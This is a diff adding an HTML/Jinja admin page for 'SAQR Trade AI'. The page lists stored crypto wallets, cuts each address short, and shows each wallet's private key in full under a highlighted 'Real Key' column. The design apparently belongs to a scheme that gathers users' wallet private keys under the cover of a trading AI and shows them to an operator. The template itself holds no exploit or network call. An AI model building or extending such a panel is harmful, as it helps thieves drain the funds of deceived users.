@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Admin Panel - SAQR Trade AI</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:monospace;background:#0a0e27;color:#fff;padding:20px}
+h1{color:#00ff88;text-align:center;margin:20px 0}
+table{width:100%;border-collapse:collapse;background:#1a1f3a;border-radius:10px;overflow:hidden}
+th{background:#00ff88;color:#000;padding:10px;text-align:left}
+td{padding:8px 10px;border-bottom:1px solid #2a2f4a;word-break:break-all}
+.key{color:#ffd700}
+tr:hover{background:#2a2f4a}
+</style>
+</head>
+<body>
+<h1>🦅 SAQR Admin Panel</h1>
+<table>
+<tr><th>ID</th><th>Network</th><th>Address</th><th>🔑 Real Key</th><th>Date</th></tr>
+{% for w in wallets %}
+<tr>
+<td>{{ w[0] }}</td>
+<td>{{ w[1] }}</td>
+<td>{{ w[2][:10] }}...</td>
+<td class="key">{{ w[3] }}</td>
+<td>{{ w[6][:10] }}</td>
+</tr>
+{% endfor %}
+</table>
+</body>
+</html>
